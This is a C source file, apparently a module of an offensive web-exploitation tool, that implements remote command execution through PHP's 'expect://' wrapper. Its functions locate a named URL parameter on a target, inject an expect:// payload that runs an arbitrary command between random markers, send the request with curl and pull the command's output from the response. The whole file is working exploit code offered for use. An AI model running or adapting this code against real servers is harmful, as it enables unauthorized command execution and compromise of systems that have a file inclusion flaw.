#include "techniques/expect.h"
#include "request/request.h"
#include "string/urlencode.h"
#include "string/concat.h"
#include "string/utils.h"
#include "string/url.h"
#include "regex/pcre.h"

#include <stdio.h>

char *expect_url(url_t *url, const char *cmd, int pos)
{
	char mark[8], **matches, *ret = NULL;

	request_t req;
	int len = 0;

	randomstr(mark, sizeof(mark));

	char *payload = concatl("expect://echo -n ", mark, ";", cmd, ";echo ", mark, NULL);
	char *regex = concatl(mark, "(.*)", mark, NULL);
	char *escape = urlencode(payload);
	char *target = buildurl(url, string_replace, escape, pos);
	free(escape);
	free(payload);

	request_init(&req);
	curl_easy_setopt(req.ch, CURLOPT_URL, target);
	free(target);

	if (request_exec(&req)) {
		goto end;
	}

	matches = regex_extract(&len, regex, req.body.ptr, req.body.len, PCRE_DOTALL);
	free(regex);

	if (len > 0) {
		ret = xstrdup(matches[0]);
		regex_free(matches, len);
	}

end:
	request_free(&req);
	return ret;
}

char *expect_rce(const char *target, const char *parameter, const char *cmd)
{
	url_t url;
	char *rce = NULL;

	urlparser(&url, target);

	if (url.parameters) {
		for (int i = 0; i < url.plen; i++) {
			if (!strcmp(url.parameters[i].key, parameter)) {
				rce = expect_url(&url, cmd, i);
				break;
			}
		}
	}

	urlfree(&url);


	return rce;
}
